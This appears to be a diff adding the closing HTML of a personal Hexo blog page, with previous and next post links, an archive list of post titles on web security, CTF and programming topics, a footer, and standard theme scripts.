+            <a href="/2024/03/21/XSS%E8%B7%A8%E7%AB%99%E6%80%BB%E7%BB%93/" title="Pre: XSS跨站总结">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2024/02/25/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/" title="Next: 学习通登录JS逆向">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/03/21/CSRF-SSRF%E6%80%BB%E7%BB%93/">CSRF&SSRF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/21/XSS%E8%B7%A8%E7%AB%99%E6%80%BB%E7%BB%93/">XSS跨站总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">文件上传总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/02/25/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/">学习通登录JS逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/01/04/%E5%88%9D%E6%8E%A2go/">初探go</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/28/%E6%B5%85%E6%B5%85%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8BVue/">浅浅学习一下Vue</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/12/25/%E5%88%9D%E8%AF%86Spring-boot/">初识Spring boot</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/11/15/%E6%9F%90%E9%97%AE%E5%8D%B7%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/">某问卷自动化脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/11/09/mysql%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%92%8Csql%E6%B3%A8%E5%85%A5/">mysql基础使用和sql注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/11/02/docker%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ACTFD%E9%A2%98%E7%9B%AE%E5%8F%91%E5%B8%83/">docker学习以及CTFD题目发布</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/11/01/2023FSCTFwebWP/">2023FSCTFwebWP</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/18/CDN%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%BB%95%E8%BF%87/">CDN技术及绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/15/%E7%88%AC%E8%99%AB/">python爬虫</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/07/15/ctfd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/">ctfd平台搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/07/14/%E8%A7%A3%E5%86%B3win11%E6%9B%B4%E6%96%B0%E5%BC%95%E8%B5%B7python%E4%B8%80%E7%B3%BB%E5%88%97%E9%94%99%E8%AF%AF/">解决win11更新引起python一系列错误</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/07/10/win11%E5%85%89%E6%A0%87%E7%BE%8E%E5%8C%96/">win11光标美化</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/07/07/%E7%88%86%E7%A0%B4token%E7%BB%95%E8%BF%87/">爆破之token绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/07/04/arp%E6%94%BB%E5%87%BB/">ARP攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/06/10/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/">排序算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/06/08/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/">Vs2022 运行终端更改</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/17/CSS/">CSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/10/HTML/">HTML</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/10/%E9%98%9F%E5%88%97/">队列</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/01/%E9%93%BE%E6%A0%88/">链栈</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/29/%E9%A1%BA%E5%BA%8F%E6%A0%88/">顺序栈</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/16/%E5%8F%8C%E9%93%BE%E8%A1%A8/">双链表</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/05/%E9%93%BE%E8%A1%A8/">链表</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/02/python3%E8%AF%AD%E6%B3%95/">python3语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/24/%E9%A1%BA%E5%BA%8F%E8%A1%A8/">顺序表</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/21/helloworld/">hello</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2024 isyang_
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
